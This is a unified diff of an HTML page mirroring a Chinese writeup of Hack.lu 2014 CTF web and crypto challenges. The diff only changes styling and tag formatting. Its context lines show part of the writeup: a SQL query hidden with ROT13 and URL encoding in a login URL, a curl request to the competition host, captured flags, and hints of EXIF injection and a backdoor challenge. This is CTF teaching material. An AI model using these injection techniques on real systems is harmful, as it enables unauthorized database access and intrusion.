@@ -3,14 +3,14 @@
 			<head>
 			     <title>Hack.lu 2014 Writeup - 一个狗</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/3420">http://drops.wooyun.org/tips/3420</a></h1>
 				
       <p>
-        <h2>0x00 Web 50 Encrypted</h2>
+        </p><h2>0x00 Web 50 Encrypted</h2>
 
-<hr />
+<hr>
 
 <blockquote>
   <p>Category: Web</p>
@@ -39,7 +39,7 @@
 <pre><code>https://wildwildweb.fluxfingers.net:1411/dologin.php?dhrel=FRYRPG+%60anzr%60+SEBZ+%60hfref%60+JURER+%60anzr%60+%3D+%27n%27+NAQ+%60cnffjbeq%60+%3D+ZQ5%28%27o%27%29
 </code></pre>
 
-<hr />
+<hr>
 
 <pre><code>#!bash
 In [22]: hackercodecs.rotx(hackercodecs.urlunquote(a),13)
@@ -52,7 +52,7 @@ Out[22]: u"query=SELECT+`name`+FROM+`users`+WHERE+`name`+=+'a'+AND+`password`+=+
 DeAdCaT___$ curl 'https://wildwildweb.fluxfingers.net:1411/dologin.php?dhrel=FRYRPG%20%60anzr%60%20SEBZ%20%60hfref%60'
 </code></pre>
 
-<hr />
+<hr>
 
 <pre><code>#!html
 &lt;!DOCTYPE html&gt;
@@ -68,7 +68,7 @@ Hello admin! The flag is flag{nobody_needs_server_side_validation}.  &lt;/body&g
 
 <h2>0x01 Web 200 ImageUpload</h2>
 
-<hr />
+<hr>
 
 <blockquote>
   <p>Category: Web Points: 200 Author: SLAZ Description: In the Wild Wild Web, there are really bad guys. The sheriff doesn’t know them all.</p>
@@ -78,7 +78,7 @@ Hello admin! The flag is flag{nobody_needs_server_side_validation}.  &lt;/body&g
 
 <p>当你登录之后，你能看到一个上传图片的表单和一个Login，上传了一个小辣椒之后，服务器生成了这么一个图片，并且下方还有一个表格。</p>
 
-<p><img src="http://static.wooyun.org/20141029/2014102906474844193.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141029/2014102906474844193.png" alt="enter image description here"></p>
 
 <p>我一开始总觉得是要绕过gd的压缩，在各种调教之前的一个绕过gd压缩的代码。后来这个题被凯神秒了，他说这是个exif注入。</p>
 
@@ -109,7 +109,7 @@ Flag: flag{1_5h07_7h3_5h3r1ff}
 
 <h2>0x02 Crypto 150 Hidden in ρlaιn sιght</h2>
 
-<hr />
+<hr>
 
 <blockquote>
   <p>Category: Crypto</p>
@@ -125,11 +125,11 @@ Flag: flag{1_5h07_7h3_5h3r1ff}
 
 <p>一个图片说明问题：</p>
 
-<p><img src="http://static.wooyun.org/20141029/2014102906474956950.jpg" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org/20141029/2014102906474956950.jpg" alt="enter image description here"></p>
 
 <h2>0x03 crypto150</h2>
 
-<hr />
+<hr>
 
 <p>下面那个长的像拉长的E的东西是</p>
 
@@ -152,7 +152,7 @@ flag{unicode_stego_is_best_stego}
 
 <h2>0x04 Web 200 Killy The Bit</h2>
 
-<hr />
+<hr>
 
 <blockquote>
   <p>Category: Web</p>
@@ -235,7 +235,7 @@ _____________________
 
 <h2>0x05 Web 200 Next Global Backdoor</h2>
 
-<hr />
+<hr>
 
 <blockquote>
   <p>Category: Web</p>
@@ -302,7 +302,7 @@ Content-Type: ls
 <p>最后cat /flag.txt即可。</p>
 
 <pre><code>flag{backdoor_business_is_hard,_fella}
-</code></pre>      </p>
+</code></pre>      <p></p>
     
 			</body>
 		</html>
